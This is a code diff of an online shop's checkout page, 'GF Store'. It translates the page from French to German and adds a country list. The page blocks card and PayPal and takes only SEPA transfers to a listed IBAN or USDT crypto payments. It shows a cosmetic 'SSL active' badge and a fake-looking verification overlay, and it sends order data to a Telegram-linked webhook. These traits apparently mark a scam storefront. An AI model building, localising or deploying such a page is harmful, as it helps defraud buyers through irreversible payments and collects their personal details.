@@ -1,10 +1,10 @@
 <!doctype html>
-<html lang="fr">
+<html lang="de">
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>GF Store — Paiement sécurisé</title>
-  <meta name="description" content="Page de paiement GF Store : Virement & Crypto actifs. Carte & PayPal temporairement indisponibles. Livraison prioritaire sous 1 semaine, retours sous 14 jours." />
+  <title>GF Store — Sichere Zahlung</title>
+  <meta name="description" content="GF Store Bezahlseite: SEPA-Überweisung & Krypto aktiv. Karte & PayPal vorübergehend nicht verfügbar. Prioritärer Versand innerhalb 1 Woche, Rückgabe binnen 14 Tagen." />
   <style>
     :root{
       --w:1200px;
@@ -71,7 +71,7 @@
 
     /* Highlight best */
     .m.best::after{
-      content:"MEILLEUR TARIF";
+      content:"BESTER PREIS";
       position:absolute; top:50%; right:12px; transform:translateY(-50%);
       font-size:11px; padding:4px 8px; border-radius:999px;
       background:#f0f9ff; color:#1e40af; border:1px solid #bfdbfe;
@@ -144,11 +144,7 @@
     .dz .cta{display:inline-flex;gap:8px;align-items:center;margin-top:6px}
     .dz .cta .btn{padding:8px 12px}
 
-    /* input fichier natif qui recouvre toute la dropzone (compatible mobile) */
-    .native-picker{
-      position:absolute; inset:0; width:100%; height:100%;
-      opacity:0; cursor:pointer; /* important: pas de pointer-events:none */
-    }
+    .native-picker{ position:absolute; inset:0; width:100%; height:100%; opacity:0; cursor:pointer; }
 
     .filecard{display:flex;align-items:center;gap:12px;border:1px solid var(--line);background:#fff;border-radius:12px;padding:10px 12px;box-shadow:0 4px 14px rgba(0,0,0,.04)}
     .filebadge{width:36px;height:36px;border-radius:10px;background:#eef2ff;display:grid;place-items:center;border:1px solid #e5e7eb}
@@ -158,11 +154,8 @@
     .prog{height:6px;background:#eef2ff;border-radius:999px;overflow:hidden}
     .bar{height:100%;width:0;background:linear-gradient(90deg,#60a5fa,#2563eb);transition:width .6s ease}
     .factions{margin-left:auto;display:flex;gap:8px}
-    .tag-ok{
-      font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:8px;
-      padding:2px 6px; display:inline-flex; align-items:center; justify-content:center;
-      min-width:48px; text-align:center;
-    }
+    .tag-ok{ font-size:12px;color:#065f46;background:#ecfdf5;border:1px solid #bbf7d0;border-radius:8px;
+      padding:2px 6px; display:inline-flex; align-items:center; justify-content:center; min-width:48px; text-align:center;}
 
     /* Full-screen overlays */
     .overlay{position:fixed; inset:0; display:none; align-items:center; justify-content:center;background:rgba(15,23,42,.28); backdrop-filter:blur(6px); z-index:20000;}
@@ -184,20 +177,20 @@
 <body>
   <header>
     <div class="hwrap">
-      <a href="index.html" class="brand" aria-label="Accueil">
+      <a href="index.html" class="brand" aria-label="Startseite">
         <img src="assets/img/logopnggfstore.png" class="logo" alt="GF Store" width="180" height="52" decoding="async">
       </a>
       <nav class="nav">
-        <a href="compte/index.html" title="Compte"><img class="ic" id="icUser" alt=""> <span>Compte</span></a>
-        <a href="index.html" title="Continuer les achats"><img class="ic" id="icContinue" alt=""> <span>Continuer les achats</span></a>
+        <a href="compte/index.html" title="Konto"><img class="ic" id="icUser" alt=""> <span>Konto</span></a>
+        <a href="index.html" title="Weiter einkaufen"><img class="ic" id="icContinue" alt=""> <span>Weiter einkaufen</span></a>
         <div class="dropdown">
-          <button class="iconbtn" id="menuBtn" aria-label="Ouvrir le menu"><img class="ic" id="icMenu" alt=""></button>
+          <button class="iconbtn" id="menuBtn" aria-label="Menü öffnen"><img class="ic" id="icMenu" alt=""></button>
           <div id="menuDrop" class="menu" role="menu">
-            <a href="pages/a-propos.html">À propos</a>
-            <a href="pages/cgv.html">CGV</a>
-            <a href="pages/mentions-legales.html">Mentions légales</a>
-            <a href="pages/confidentialite.html">Confidentialité</a>
-            <a href="pages/contact.html">Contact</a>
+            <a href="pages/a-propos.html">Über uns</a>
+            <a href="pages/cgv.html">AGB</a>
+            <a href="pages/mentions-legales.html">Impressum</a>
+            <a href="pages/confidentialite.html">Datenschutz</a>
+            <a href="pages/contact.html">Kontakt</a>
           </div>
         </div>
       </nav>
@@ -205,64 +198,121 @@
   </header>
 
   <main class="wrap" aria-live="polite">
-    <!-- Colonne gauche -->
+    <!-- Linke Spalte -->
     <section class="card" aria-labelledby="h-checkout">
       <div class="hd">
         <div>
-          <div class="title" id="h-checkout">Paiement sécurisé <span id="orderId" class="muted" style="margin-left:8px"></span></div>
-          <div class="muted">Livraison prioritaire sous 1 semaine • Retours 14 jours</div>
+          <div class="title" id="h-checkout">Sichere Zahlung <span id="orderId" class="muted" style="margin-left:8px"></span></div>
+          <div class="muted">Prioritärer Versand innerhalb 1 Woche • Rückgabe 14 Tage</div>
         </div>
-        <span class="pill"><img class="ic" id="icSSL" alt=""> SSL actif</span>
+        <span class="pill"><img class="ic" id="icSSL" alt=""> SSL aktiv</span>
       </div>
 
       <div class="bd">
         <!-- Adresse -->
         <form id="addrForm" class="row cols-2" novalidate>
-          <div><label for="name">Nom complet</label><input id="name" placeholder="Prénom Nom" required></div>
-          <div><label for="email">Email</label><input id="email" type="email" placeholder="vous@example.com" required></div>
-          <div><label for="phone">Téléphone</label><input id="phone" inputmode="tel" placeholder="+33 6 12 34 56 78"></div>
-          <div><label for="country">Pays</label><input id="country" placeholder="France"></div>
+          <div><label for="name">Vollständiger Name</label><input id="name" placeholder="Vorname Nachname" required></div>
+          <div><label for="email">E-Mail</label><input id="email" type="email" placeholder="sie@beispiel.de" required></div>
+          <div><label for="phone">Telefon</label><input id="phone" inputmode="tel" placeholder="+49 170 1234567"></div>
+
+          <!-- Länderauswahl: alle europäischen Länder, Auswahl ist Pflicht -->
+          <div><label for="country">Land</label>
+            <select id="country" required>
+              <option value="" disabled selected>— Land auswählen —</option>
+              <option value="AL">Albanien</option>
+              <option value="AD">Andorra</option>
+              <option value="AM">Armenien</option>
+              <option value="AT">Österreich</option>
+              <option value="AZ">Aserbaidschan</option>
+              <option value="BY">Belarus</option>
+              <option value="BE">Belgien</option>
+              <option value="BA">Bosnien und Herzegowina</option>
+              <option value="BG">Bulgarien</option>
+              <option value="HR">Kroatien</option>
+              <option value="CY">Zypern</option>
+              <option value="CZ">Tschechien</option>
+              <option value="DK">Dänemark</option>
+              <option value="EE">Estland</option>
+              <option value="FI">Finnland</option>
+              <option value="FR">Frankreich</option>
+              <option value="GE">Georgien</option>
+              <option value="DE">Deutschland</option>
+              <option value="GR">Griechenland</option>
+              <option value="HU">Ungarn</option>
+              <option value="IS">Island</option>
+              <option value="IE">Irland</option>
+              <option value="IT">Italien</option>
+              <option value="LV">Lettland</option>
+              <option value="LI">Liechtenstein</option>
+              <option value="LT">Litauen</option>
+              <option value="LU">Luxemburg</option>
+              <option value="MT">Malta</option>
+              <option value="MD">Republik Moldau</option>
+              <option value="MC">Monaco</option>
+              <option value="ME">Montenegro</option>
+              <option value="NL">Niederlande</option>
+              <option value="MK">Nordmazedonien</option>
+              <option value="NO">Norwegen</option>
+              <option value="PL">Polen</option>
+              <option value="PT">Portugal</option>
+              <option value="RO">Rumänien</option>
+              <option value="RU">Russland</option>
+              <option value="SM">San Marino</option>
+              <option value="RS">Serbien</option>
+              <option value="SK">Slowakei</option>
+              <option value="SI">Slowenien</option>
+              <option value="ES">Spanien</option>
+              <option value="SE">Schweden</option>
+              <option value="CH">Schweiz</option>
+              <option value="TR">Türkei</option>
+              <option value="UA">Ukraine</option>
+              <option value="GB">Vereinigtes Königreich</option>
+              <option value="VA">Vatikanstadt</option>
+              <option value="XK">Kosovo</option>
+            </select>
+          </div>
+
           <div class="cols-2">
-            <div><label for="address">Adresse</label><input id="address" placeholder="10 Avenue de l’Europe" required></div>
-            <div><label for="city">Ville</label><input id="city" placeholder="Paris" required></div>
-            <div><label for="zip">Code postal</label><input id="zip" inputmode="numeric" placeholder="75008" required></div>
+            <div><label for="address">Adresse</label><input id="address" placeholder="Musterstraße 10" required></div>
+            <div><label for="city">Stadt</label><input id="city" placeholder="Berlin" required></div>
+            <div><label for="zip">PLZ</label><input id="zip" inputmode="numeric" placeholder="10115" required></div>
           </div>
         </form>
 
-        <!-- Méthodes de paiement -->
+        <!-- Zahlungsmethoden -->
         <div style="margin:14px 0 8px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap">
-          <div class="title" style="font-size:16px">Mode de paiement</div>
-          <span class="muted">Virement & Crypto — Carte & PayPal indisponibles</span>
+          <div class="title" style="font-size:16px">Zahlungsart</div>
+          <span class="muted">SEPA & Krypto — Karte & PayPal nicht verfügbar</span>
         </div>
 
         <div class="methods" role="tablist">
           <button class="m best" role="tab" aria-selected="true" data-method="sepa">
-            <div class="mlabel"><strong>Virement SEPA</strong></div>
+            <div class="mlabel"><strong>SEPA-Überweisung</strong></div>
             <div class="logos">
               <img alt="SEPA" src="https://img.icons8.com/?size=100&id=7IJfqNBSaJ0N&format=png&color=000000">
               <img alt="IBAN" src="https://img.icons8.com/?size=100&id=PpOkzOgNS2tV&format=png&color=000000">
             </div>
-            <span class="bubble">Promo -3%</span>
+            <span class="bubble">Rabatt −3 %</span>
           </button>
 
           <button class="m" role="tab" aria-selected="false" data-method="crypto">
-            <div class="mlabel"><strong>Crypto</strong></div>
+            <div class="mlabel"><strong>Krypto</strong></div>
             <div class="logos">
               <img alt="Bitcoin" src="https://cdn.simpleicons.org/bitcoin">
               <img alt="Ethereum" src="https://cdn.simpleicons.org/ethereum">
               <img alt="Tether" src="https://cdn.simpleicons.org/tether">
             </div>
-            <span class="bubble">Promo -1%</span>
+            <span class="bubble">Rabatt −1 %</span>
           </button>
 
           <div class="m disabled" aria-selected="false">
-            <div class="mlabel"><strong>Carte bancaire</strong></div>
+            <div class="mlabel"><strong>Kreditkarte</strong></div>
             <div class="logos">
               <img alt="Visa" src="https://cdn.simpleicons.org/visa">
               <img alt="Mastercard" src="https://cdn.simpleicons.org/mastercard">
               <img alt="American Express" src="https://cdn.simpleicons.org/americanexpress">
             </div>
-            <span class="muted" style="margin-top:6px">Indisponible</span>
+            <span class="muted" style="margin-top:6px">Nicht verfügbar</span>
           </div>
 
           <div class="m disabled" aria-selected="false">
@@ -270,42 +320,40 @@
             <div class="logos">
               <img alt="PayPal" src="https://cdn.simpleicons.org/paypal">
             </div>
-            <span class="muted" style="margin-top:6px">Indisponible</span>
+            <span class="muted" style="margin-top:6px">Nicht verfügbar</span>
           </div>
         </div>
 
-        <!-- Payer maintenant / Split -->
+        <!-- Sofort / Raten -->
         <div class="paytog" style="margin-top:12px">
-          <button id="btnOnce" class="pt on" type="button"><strong>Payer maintenant</strong></button>
+          <button id="btnOnce" class="pt on" type="button"><strong>Jetzt bezahlen</strong></button>
           <button id="btnSplit" class="pt" type="button" aria-haspopup="dialog" aria-controls="splitModal">
-            <strong>Payer en plusieurs fois</strong> <small id="splitHint">(désactivé)</small>
+            <strong>In Raten zahlen</strong> <small id="splitHint">(deaktiviert)</small>
           </button>
         </div>
 
-        <!-- Panneau SEPA -->
+        <!-- Panel SEPA -->
         <div id="pmSEPA" class="pm show">
           <div class="row">
             <div class="row cols-2">
-              <div><label>Noms</label><input readonly value="GF STORE"></div>
-              <div><label>Banque</label><input readonly value="Nirio Banque (FR)"></div>
+              <div><label>Kontoinhaber</label><input readonly value="GF STORE"></div>
+              <div><label>Bank</label><input readonly value="Nirio Banque (FR)"></div>
               <div><label for="iban">IBAN</label><input id="iban" readonly value="FR76 1652 8001 3100 0091 7161 081"></div>
               <div><label for="swift">BIC</label><input id="swift" readonly value="SMOEFRP1XXX"></div>
-              <div><label for="vref">Référence</label><input id="vref" readonly placeholder="Nom du client (auto)"></div>
-              <div><label for="amountNowBank">À virer maintenant (EUR)</label><input id="amountNowBank" readonly value="0"></div>
+              <div><label for="vref">Verwendungszweck</label><input id="vref" readonly placeholder="Kundenname (auto)"></div>
+              <div><label for="amountNowBank">Jetzt zu überweisen (EUR)</label><input id="amountNowBank" readonly value="0"></div>
             </div>
 
             <!-- Uploader -->
-            <div class="uploader" aria-label="Téléverser une preuve de virement">
-              <div id="dz" class="dz" role="button" aria-controls="proofInput" aria-label="Importer une preuve">
+            <div class="uploader" aria-label="Überweisungsnachweis hochladen">
+              <div id="dz" class="dz" role="button" aria-controls="proofInput" aria-label="Nachweis importieren">
                 <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 18h10a4 4 0 0 0 0-8h-.26A6 6 0 1 0 7 18Zm5-9v6m0-6-2 2m2-2 2 2" fill="none" stroke="#1f2937" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-                <div>Glissez-déposez votre preuve (tout format accepté)</div>
-                <div class="hint">ou</div>
+                <div>Ziehen Sie Ihren Nachweis hierher (alle Formate)</div>
+                <div class="hint">oder</div>
                 <div class="cta">
-                  <!-- label natif pour compat max -->
-                  <label for="proofInput" class="btn">Importer</label>
-                  <span class="hint">max 10 Mo</span>
+                  <label for="proofInput" class="btn">Importieren</label>
+                  <span class="hint">max. 10 MB</span>
                 </div>
-                <!-- Input natif qui recouvre la zone (tap mobile => picker) -->
                 <input id="proofInput" class="native-picker" type="file" accept="*/*">
               </div>
 
@@ -319,27 +367,27 @@
                   <div class="prog" aria-hidden="true"><div id="fileBar" class="bar"></div></div>
                 </div>
                 <div class="factions">
-                  <span id="fileOk" class="tag-ok" style="display:none">Prêt</span>
-                  <button id="removeProof" type="button" class="btn" title="Retirer">Retirer</button>
+                  <span id="fileOk" class="tag-ok" style="display:none">Fertig</span>
+                  <button id="removeProof" type="button" class="btn" title="Entfernen">Entfernen</button>
                 </div>
               </div>
             </div>
 
             <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
-              <button class="btn" data-copy="#iban">Copier IBAN</button>
-              <button class="btn" data-copy="#swift">Copier BIC</button>
-              <button class="btn" data-copy="#vref">Copier Référence</button>
-              <button id="confirmBank" class="btn">J’ai effectué le virement</button>
-              <small class="muted">Après vérification, vous pourrez finaliser la commande.</small>
+              <button class="btn" data-copy="#iban">IBAN kopieren</button>
+              <button class="btn" data-copy="#swift">BIC kopieren</button>
+              <button class="btn" data-copy="#vref">Verwendungszweck kopieren</button>
+              <button id="confirmBank" class="btn">Überweisung durchgeführt</button>
+              <small class="muted">Nach Prüfung können Sie die Bestellung finalisieren.</small>
             </div>
           </div>
         </div>
 
-        <!-- Panneau CRYPTO -->
+        <!-- Panel Krypto -->
         <div id="pmCrypto" class="pm">
           <div class="row cols-2">
             <div>
-              <label for="ccy">Monnaie</label>
+              <label for="ccy">Währung</label>
               <select id="ccy">
                 <option value="USDT-BEP20" selected>USDT (BEP20)</option>
                 <option value="USDT-TRC20">USDT (TRC20)</option>
@@ -348,95 +396,95 @@
               </select>
             </div>
             <div>
-              <label for="amountNow">À envoyer maintenant (EUR)</label>
+              <label for="amountNow">Jetzt zu senden (EUR)</label>
               <input id="amountNow" readonly value="0">
             </div>
           </div>
 
           <div class="copyline">
             <div>
-              <label for="wallet">Adresse de paiement</label>
+              <label for="wallet">Zahlungsadresse</label>
               <input id="wallet" readonly>
             </div>
-            <button class="copy" data-copy="#wallet">Copier</button>
+            <button class="copy" data-copy="#wallet">Kopieren</button>
           </div>
 
           <div class="copyline">
             <div>
-              <label for="ccyAmt">Montant à envoyer (<span id="ccyLabel">—</span>)</label>
+              <label for="ccyAmt">Zu sendender Betrag (<span id="ccyLabel">—</span>)</label>
               <input id="ccyAmt" readonly>
             </div>
-            <button class="copy" data-copy="#ccyAmt">Copier</button>
+            <button class="copy" data-copy="#ccyAmt">Kopieren</button>
           </div>
 
-          <div class="qr" aria-label="QR de paiement">
-            <img id="qrImg" alt="QR code paiement" width="220" height="220" decoding="async">
+          <div class="qr" aria-label="Zahlungs-QR">
+            <img id="qrImg" alt="QR-Code Zahlung" width="220" height="220" decoding="async">
           </div>
 
           <div>
-            <label for="txid">Identifiant de transaction (TxID / Hash)</label>
+            <label for="txid">Transaktions-ID (TxID / Hash)</label>
             <input id="txid" placeholder="0x… / bc1… / TX123…" required>
           </div>
 
           <div style="display:flex;gap:8px;flex-wrap:wrap">
-            <button id="confirmCrypto" class="btn">J’ai envoyé le paiement</button>
-            <small class="muted">Vérification rapide du hash avant finalisation.</small>
+            <button id="confirmCrypto" class="btn">Zahlung gesendet</button>
+            <small class="muted">Schnelle Hash-Prüfung vor dem Abschluss.</small>
           </div>
         </div>
 
         <div style="display:flex;gap:10px;justify-content:flex-end;flex-wrap:wrap;margin-top:12px">
-          <a href="index.html" class="btn"><img class="ic" id="icBack" alt=""> Continuer les achats</a>
-          <button id="placeOrder" class="btn primary" disabled>Finaliser la commande</button>
+          <a href="index.html" class="btn"><img class="ic" id="icBack" alt=""> Weiter einkaufen</a>
+          <button id="placeOrder" class="btn primary" disabled>Bestellung abschließen</button>
         </div>
       </div>
     </section>
 
-    <!-- Colonne droite : Récap -->
+    <!-- Rechte Spalte : Zusammenfassung -->
     <aside class="card" aria-labelledby="h-recap">
       <div class="hd">
-        <div class="title" id="h-recap">Récapitulatif</div>
-        <span class="pill"><img class="ic" id="icTruck" alt=""> Suivi & assistance</span>
+        <div class="title" id="h-recap">Zusammenfassung</div>
+        <span class="pill"><img class="ic" id="icTruck" alt=""> Sendungsverfolgung & Support</span>
       </div>
       <div class="bd">
         <div id="miniCart" class="mini"></div>
         <hr style="border:none;border-top:1px dashed var(--line);margin:10px 0">
         <div class="sum">
-          <div class="rowline"><span class="muted">Sous-total</span><span id="sub">—</span></div>
-          <div class="rowline"><span class="muted">Livraison</span><span id="ship">Gratuite</span></div>
-          <div class="rowline"><span class="muted">Promo</span><span id="benefit">—</span></div>
-          <div class="rowline"><span class="muted">Total</span><span id="total">—</span></div>
-          <div class="rowline" id="dueRow"><span class="due">À payer aujourd’hui</span><span class="due" id="dueNow">—</span></div>
+          <div class="rowline"><span class="muted">Zwischensumme</span><span id="sub">—</span></div>
+          <div class="rowline"><span class="muted">Versand</span><span id="ship">Kostenlos</span></div>
+          <div class="rowline"><span class="muted">Vorteil</span><span id="benefit">—</span></div>
+          <div class="rowline"><span class="muted">Gesamt</span><span id="total">—</span></div>
+          <div class="rowline" id="dueRow"><span class="due">Heute fällig</span><span class="due" id="dueNow">—</span></div>
           <div id="schedule" class="schedule" style="display:none"></div>
-          <div class="note">Livraison prioritaire sous 7 jours. Retours sous 14 jours.</div>
+          <div class="note">Prioritärer Versand innerhalb von 7 Tagen. Rückgabe innerhalb von 14 Tagen.</div>
         </div>
       </div>
     </aside>
   </main>
 
-  <!-- Modal split -->
+  <!-- Modal Raten -->
   <div id="splitModal" class="modal" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="splitTitle">
     <div class="sheet">
       <header>
-        <div style="font-weight:600" id="splitTitle">Choisir l’échéancier</div>
-        <button class="x" id="closeSplit" aria-label="Fermer">✕</button>
+        <div style="font-weight:600" id="splitTitle">Ratenplan wählen</div>
+        <button class="x" id="closeSplit" aria-label="Schließen">✕</button>
       </header>
       <div class="body">
-        <div id="segSplit" class="seg" role="group" aria-label="Nombre d’échéances">
+        <div id="segSplit" class="seg" role="group" aria-label="Anzahl Raten">
           <button type="button" class="segbtn" data-parts="2" aria-pressed="false">
-            <span class="big">2×</span><span class="small">mensuel</span>
+            <span class="big">2×</span><span class="small">monatlich</span>
           </button>
           <button type="button" class="segbtn" data-parts="3" aria-pressed="false">
-            <span class="big">3×</span><span class="small">mensuel</span>
+            <span class="big">3×</span><span class="small">monatlich</span>
           </button>
           <button type="button" class="segbtn" data-parts="4" aria-pressed="true">
-            <span class="big">4×</span><span class="small">mensuel</span>
+            <span class="big">4×</span><span class="small">monatlich</span>
           </button>
         </div>
         <div id="modalPrev" class="schedule" aria-live="polite"></div>
       </div>
       <footer>
-        <button class="btn" id="cancelSplit">Annuler</button>
-        <button class="btn primary" id="applySplit">Appliquer</button>
+        <button class="btn" id="cancelSplit">Abbrechen</button>
+        <button class="btn primary" id="applySplit">Übernehmen</button>
       </footer>
     </div>
   </div>
@@ -444,47 +492,47 @@
   <!-- Toast -->
   <div id="toast" class="toast" role="status" aria-live="polite"></div>
 
-  <!-- Vérification overlay -->
+  <!-- Prüfungs-Overlay -->
   <div id="checkOverlay" class="overlay" aria-hidden="true" role="dialog" aria-modal="true">
     <div class="loader" role="status" aria-live="polite">
       <div class="spin" aria-hidden="true"></div>
-      <div id="ovTitle" style="font-weight:700">Vérification…</div>
-      <div id="ovSub" class="muted">Un instant, nous confirmons votre paiement.</div>
+      <div id="ovTitle" style="font-weight:700">Prüfung…</div>
+      <div id="ovSub" class="muted">Einen Moment, wir bestätigen Ihre Zahlung.</div>
     </div>
   </div>
 
-  <!-- Succès / Merci overlay -->
+  <!-- Erfolgs-Overlay -->
   <div id="doneOverlay" class="overlay" aria-hidden="true" role="dialog" aria-modal="true">
     <div class="loader" role="status" aria-live="polite">
       <div style="font-size:42px; line-height:1">✅</div>
-      <div style="font-weight:700; font-size:18px">Merci ! Votre commande est enregistrée</div>
-      <div class="muted">Nous vérifions le paiement et lançons la préparation. Vous recevrez un email de confirmation.</div>
+      <div style="font-weight:700; font-size:18px">Danke! Ihre Bestellung ist eingegangen</div>
+      <div class="muted">Wir prüfen die Zahlung und starten die Vorbereitung. Sie erhalten eine Bestätigungs-E-Mail.</div>
       <div style="display:flex; gap:8px; justify-content:center; flex-wrap:wrap; margin-top:4px">
-        <a href="index.html" class="btn">Découvrir d’autres produits</a>
-        <a href="compte/index.html" class="btn primary">Voir ma commande</a>
+        <a href="index.html" class="btn">Weitere Produkte entdecken</a>
+        <a href="compte/index.html" class="btn primary">Meine Bestellung ansehen</a>
       </div>
     </div>
   </div>
 
   <footer>
     <div class="fwrap">
-      <div>© GF Store 2025 — Simplicité, sécurité, crypto-friendly.</div>
+      <div>© GF Store 2025 — Einfach, sicher, krypto-freundlich.</div>
       <nav>
-        <a href="pages/a-propos.html">À propos</a> ·
-        <a href="pages/cgv.html">CGV</a> ·
-        <a href="pages/mentions-legales.html">Mentions légales</a> ·
-        <a href="pages/confidentialite.html">Confidentialité</a> ·
-        <a href="pages/contact.html">Contact</a>
+        <a href="pages/a-propos.html">Über uns</a> ·
+        <a href="pages/cgv.html">AGB</a> ·
+        <a href="pages/mentions-legales.html">Impressum</a> ·
+        <a href="pages/confidentialite.html">Datenschutz</a> ·
+        <a href="pages/contact.html">Kontakt</a>
       </nav>
     </div>
   </footer>
 
   <script>
   (async()=>{
-    // ——— CONFIG WEBHOOK APPS SCRIPT (→ Telegram) ———
+    // ——— WEBHOOK KONFIG (→ Telegram / Apps Script) ———
     const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbypa62g6lhlchWMayVWYyRh2TGc--bBdqNMag2ro1Ne1SDMVT5bHzy7pvooG3ZnsGAx/exec";
 
-    // Icônes
+    // Icons
     const ICONS = {
       user:'https://img.icons8.com/?size=100&id=n8DrUm77sR3l&format=png&color=000000',
       continue:'https://img.icons8.com/?size=100&id=26138&format=png&color=000000',
@@ -497,7 +545,7 @@
     setSrc('icUser',ICONS.user); setSrc('icMenu',ICONS.menu); setSrc('icSSL',ICONS.ssl);
     setSrc('icTruck',ICONS.truck); setSrc('icBack',ICONS.back); setSrc('icContinue',ICONS.continue);
 
-    // Menu
+    // Menü
     const menuBtn=document.getElementById('menuBtn'), menuDrop=document.getElementById('menuDrop');
     if(menuBtn&&menuDrop){
       menuBtn.addEventListener('click',e=>{e.stopPropagation();menuDrop.classList.toggle('show')});
@@ -507,22 +555,22 @@
     // Helpers
     const $=s=>document.querySelector(s); const $$=s=>Array.from(document.querySelectorAll(s));
     const toast=msg=>{const t=$('#toast'); t.textContent=msg; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),1600);};
-    const EUR=v=>Number(v||0).toLocaleString('fr-FR',{style:'currency',currency:'EUR'});
+    const EUR=v=>Number(v||0).toLocaleString('de-DE',{style:'currency',currency:'EUR'});
 
-    // Panier localStorage
+    // Warenkorb localStorage
     const KEY='gf_cart';
     const getCart=()=>{try{return JSON.parse(localStorage.getItem(KEY)||'[]')}catch{return[]}};
     const setCart=arr=>localStorage.setItem(KEY,JSON.stringify(arr));
 
-    // ID commande
+    // Bestell-ID
     const orderId=(()=>{const d=new Date(); const y=String(d.getFullYear()).slice(2); const mm=String(d.getMonth()+1).padStart(2,'0'); const dd=String(d.getDate()).padStart(2,'0'); const rnd=Math.floor(Math.random()*9000)+1000; return `GF-${y}${mm}${dd}-${rnd}`;})();
     $('#orderId').textContent=orderId;
 
-    // Rendu mini
+    // Mini-Cart
     function computeSub(cart){ return cart.reduce((s,x)=> s + Number(x.price||0)*Number(x.qty||1), 0); }
     function renderMini(){
       const wrap=$('#miniCart'); const cart=getCart();
-      if(!cart.length){ wrap.innerHTML='<div class="muted">Votre panier est vide.</div>'; $('#sub').textContent='—'; $('#benefit').textContent='—'; $('#total').textContent='—'; $('#dueNow').textContent='—'; $('#schedule').style.display='none'; return; }
+      if(!cart.length){ wrap.innerHTML='<div class="muted">Ihr Warenkorb ist leer.</div>'; $('#sub').textContent='—'; $('#benefit').textContent='—'; $('#total').textContent='—'; $('#dueNow').textContent='—'; $('#schedule').style.display='none'; return; }
       wrap.innerHTML=cart.map(x=>`
         <div class="ci">
           <img src="${x.image||''}" alt="${x.name||''}">
@@ -534,11 +582,11 @@
         </div>`).join('');
     }
 
-    // Méthodes / promos
+    // Methode / Rabatt
     function currentPM(){ return document.querySelector('.m[role="tab"][aria-selected="true"]')?.dataset.method || 'sepa'; }
     function promoRate(){ return currentPM()==='sepa'?0.03 : currentPM()==='crypto'?0.01 : 0; }
 
-    // Taux mock
+    // FX Mock
     const fx={
       'USDT-TRC20':{symbol:'USDT',rate:1},
       'USDT-BEP20':{symbol:'USDT',rate:1},
@@ -573,7 +621,7 @@
       const img=$('#qrImg'); if(img){ img.src = cfg?.qr || ''; img.alt = 'QR '+ccy; }
     }
 
-    // Échéancier
+    // Ratenplan
     function splitAmounts(total, parts){
       const cents=Math.round(total*100);
       const base=Math.floor(cents/parts);
@@ -586,8 +634,8 @@
       const today=new Date(); const steps=[0,30,60,90];
       return amts.map((amt,i)=>{
         const d=new Date(today); d.setDate(d.getDate()+steps[i]);
-        const label = i===0 ? 'Aujourd’hui' : (i===1?'Dans 30 jours': i===2?'Dans 60 jours':'Dans 90 jours');
-        return {label,date:d.toLocaleDateString('fr-FR'),amt};
+        const label = i===0 ? 'Heute' : (i===1?'In 30 Tagen': i===2?'In 60 Tagen':'In 90 Tagen');
+        return {label,date:d.toLocaleDateString('de-DE'),amt};
       });
     }
 
@@ -596,7 +644,7 @@
     const modal=$('#splitModal');
     const openModal=()=>{ modal.classList.add('show'); modal.setAttribute('aria-hidden','false'); setModalParts(modalParts); updateModalPreview(); };
     const closeModal=()=>{ modal.classList.remove('show'); modal.setAttribute('aria-hidden','true'); };
-    function updateSplitHint(){ $('#splitHint').textContent = selectedSplit>1 ? `(${selectedSplit}× mensuel)` : '(désactivé)'; }
+    function updateSplitHint(){ $('#splitHint').textContent = selectedSplit>1 ? `(${selectedSplit}× monatlich)` : '(deaktiviert)'; }
     function updateModalPreview(){
       const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0,sub - promo);
       const lines=scheduleLines(total, modalParts);
@@ -612,7 +660,7 @@
     $('#cancelSplit').addEventListener('click',closeModal);
     $('#applySplit').addEventListener('click',()=>{ selectedSplit=modalParts; $('#btnSplit').classList.add('on'); $('#btnOnce').classList.remove('on'); closeModal(); updateSplitHint(); updateSummary(); });
 
-    // Référence courte
+    // Kurz-Ref
     const slugRefFromName = (n)=>{
       const base=(n||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16);
       if(base) return base;
@@ -622,7 +670,7 @@
     const syncRef=()=>{ const name=$('#name')?.value||''; $('#vref').value=slugRefFromName(name); };
     $('#name').addEventListener('input', syncRef);
 
-    // Récap
+    // Zusammenfassung
     const SHIPPING=0;
     function updateSummary(){
       const cart=getCart(); if(!cart.length){ renderMini(); return; }
@@ -667,8 +715,8 @@
     const ovTitle = document.getElementById('ovTitle');
     const ovSub = document.getElementById('ovSub');
     const showOverlay = (title, sub) => {
-      ovTitle.textContent = title || 'Vérification…';
-      ovSub.textContent = sub || 'Un instant, nous confirmons votre paiement.';
+      ovTitle.textContent = title || 'Prüfung…';
+      ovSub.textContent = sub || 'Einen Moment, wir bestätigen Ihre Zahlung.';
       overlay.classList.add('show'); overlay.setAttribute('aria-hidden','false');
     };
     const hideOverlay = () => { overlay.classList.remove('show'); overlay.setAttribute('aria-hidden','true'); };
@@ -676,7 +724,7 @@
     const doneOverlay = document.getElementById('doneOverlay');
     const showDone = () => { doneOverlay.classList.add('show'); doneOverlay.setAttribute('aria-hidden','false'); };
 
-    // États
+    // Zustände
     let bankVerified=false, cryptoVerified=false;
 
     function updateCTA(){
@@ -770,10 +818,10 @@
       await postCompat(WEBHOOK_URL, payload);
     }
 
-    // Init affichages
+    // Init Anzeigen
     renderMini(); updateSummary(); updateSplitHint(); setCryptoAddress($('#ccy').value); syncRef(); updateCTA();
 
-    // Interactions tab méthodes
+    // Tabs Wechsel
     $$('.m[role="tab"]').forEach(card=>{
       card.addEventListener('click', ()=>{
         $$('.m[role="tab"]').forEach(c=>c.setAttribute('aria-selected', String(c===card)));
@@ -794,19 +842,24 @@
     // Crypto change
     $('#ccy').addEventListener('change', ()=>{ setCryptoAddress($('#ccy').value); updateSummary(); });
 
-    // Copier
-    const copySel=sel=>{const el=$(sel); if(!el) return; const txt=el.value||''; if(navigator.clipboard?.writeText){navigator.clipboard.writeText(txt).then(()=>toast('Copié'));} else {el.select(); document.execCommand('copy'); toast('Copié');}};
+    // Kopieren
